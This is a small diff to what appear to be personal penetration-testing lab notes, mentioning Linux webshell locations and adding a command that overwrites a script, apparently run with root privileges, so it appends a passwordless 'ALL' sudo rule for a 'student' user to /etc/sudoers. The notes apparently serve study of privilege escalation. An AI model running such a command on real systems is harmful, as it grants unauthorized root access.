@@ -753,4 +753,8 @@ ls -al /usr/share/webshells - to check pre-packed Linux webshells
 - is a bash script that copies the message from home to tmp
 ![[Pasted image 20230216203325.png]]
 
-- printf '#!/bin/bash\echo "student ALL=NOPASSWD"'
+- printf '#!/bin/bash\\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
+![[Pasted image 20230216203626.png]]
+
+![[Pasted image 20230216203931.png]]
+
